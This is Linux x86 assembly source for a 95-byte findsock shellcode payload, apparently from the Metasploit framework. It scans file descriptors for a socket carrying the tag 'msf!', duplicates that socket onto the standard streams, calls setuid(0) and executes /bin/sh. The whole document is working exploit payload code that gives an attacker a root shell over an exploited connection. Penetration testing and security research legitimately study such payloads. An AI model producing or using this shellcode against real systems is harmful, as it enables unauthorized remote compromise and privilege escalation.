BITS 32

; findsock via recv MSG_DONTWAIT by spoonm
; thanks to skape for ideas

; OS/CPU: linux/x86
; Total Size: 95


mov edi, "msf!"

xor esi, esi
; mov cx, 0xffff ; replaced for dec
dec si

; esi = loop counter
multitry:

xor edx, edx
mov dx, 0x0fff

; edx = loop counter
recv_loop:

mov eax, esp
push BYTE 0x40 ; flags (MSG_DONTWAIT)
push BYTE 0x04 ; recv len (4)
push eax ; store recv'd data at end of our stack block
push edx ; socket fd
mov ecx, esp ; args ptr

push BYTE 0x0a
pop ebx ; socketcall 0x0a (recv)
push BYTE 0x66
pop eax ; syscall socketcall (0x66)
int 0x80

sub esp, BYTE -16
cmp [esp], edi ; check for tag
je shell

dec edx
jns recv_loop

dec esi
jns multitry

; exit
xor eax, eax
inc eax
int 0x80 ; syscall exit (1)


shell:
mov ebx, edx

; dup loop, rockin hard via skape
; socket fd in ebx
push BYTE 0x02
pop ecx ; get counter (2) in ecx
dup_loop:
push BYTE 0x3f
pop eax ; syscall 0x3f (dup2)
int 0x80
dec ecx
jns dup_loop

; setuid(0)
push BYTE 0x17
pop eax ; syscall 0x17 (setuid)
xor ebx, ebx ; uid_t 0
int 0x80

; ebx is zero here, but I
; couldn't find a way to make that help
push BYTE 0x0b
pop eax
cdq ; zero edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push edx
push ebx
mov ecx, esp
int 0x80

